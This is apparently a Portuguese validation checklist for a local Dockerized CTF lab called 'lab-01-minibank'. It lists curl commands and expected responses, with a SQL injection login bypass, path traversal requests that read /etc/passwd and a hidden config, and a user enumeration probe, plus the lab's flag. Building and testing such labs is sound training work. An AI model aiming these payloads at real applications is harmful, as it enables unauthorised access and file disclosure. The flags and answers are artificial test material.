# Validacao do Release Candidate

Comandos esperados para validar o `lab-01-minibank`.

```bash
cd ~/ctf-labs
grep -Rho "FLAG{[^}]*}" lab-01-minibank | sort -u
```

```bash
cd ~/ctf-labs/lab-01-minibank
sudo docker compose up --build
```

```bash
curl -i http://localhost:8088
curl -i http://localhost:8088/status
curl -i http://localhost:8088/robots.txt
curl -i http://localhost:8088/dev.txt
curl -i -X POST http://127.0.0.1:8088/login -d "username=naoexiste" -d "password=teste"
curl -i -X POST http://127.0.0.1:8088/login -d "username=joao" -d "password=errada"
curl -i -c cookies.txt -X POST http://127.0.0.1:8088/login -d "username=admin' OR '1'='1' -- " -d "password=teste"
curl -i "http://localhost:8088/download?file=public-info.txt"
curl -i "http://localhost:8088/download?file=report-q2.txt"
curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
curl -i "http://localhost:8088/download?file=../config/legacy.conf"
```

Resultados esperados para o login:

- usuario inexistente: `Usuario nao encontrado.`
- usuario existente com senha errada: `Senha invalida.`
- SQL Injection: `302 Found` com `Location: /dashboard`

Resultados esperados para o Path Traversal:

- `/status`: vaza `internal_path=/usr/src/app`
- `public-info.txt`: prova o download normal
- `report-q2.txt`: revela a pista `config` e `legacy.conf`
- `../../../../etc/passwd`: prova leitura fora de `/usr/src/app/files`
- `../config/legacy.conf`: retorna `FLAG{path_traversal_capturada}`
